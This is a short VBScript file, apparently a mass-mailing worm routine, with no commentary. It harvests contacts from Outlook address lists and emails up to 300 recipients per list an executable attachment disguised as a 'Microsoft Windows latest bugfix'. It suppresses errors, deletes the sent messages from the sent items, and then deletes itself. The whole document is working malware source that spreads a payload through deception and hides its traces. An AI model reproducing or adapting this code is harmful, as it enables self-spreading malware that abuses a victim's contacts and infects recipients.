On Error Resume Next
Dim adrenaline, Mail, Counter, A, B, C, D, E, F
Set adrenaline = CreateObject("outlook.application")
Set Mail = adrenaline.GetNameSpace("MAPI")
For A = 1 To Mail.AddressLists.Count
Set B = Mail.AddressLists(A)
Counter = 1
Set C = adrenaline.CreateItem(0)
For D = 1 To B.AddressEntries.Count
E = B.AddressEntries(Counter)
C.Recipients.Add E
Counter = Counter + 1
If Counter > 300 Then Exit For
Next
C.Subject = "Microsoft Windows latest bugfix"
C.Attachments.Add "C:\WINDOWS\system\bugfix.exe"
C.DeleteAfterSubmit = True
C.Send
E = ""
Next
Set F = CreateObject("Scripting.FileSystemObject")
F.DeleteFile Wscript.ScriptFullName
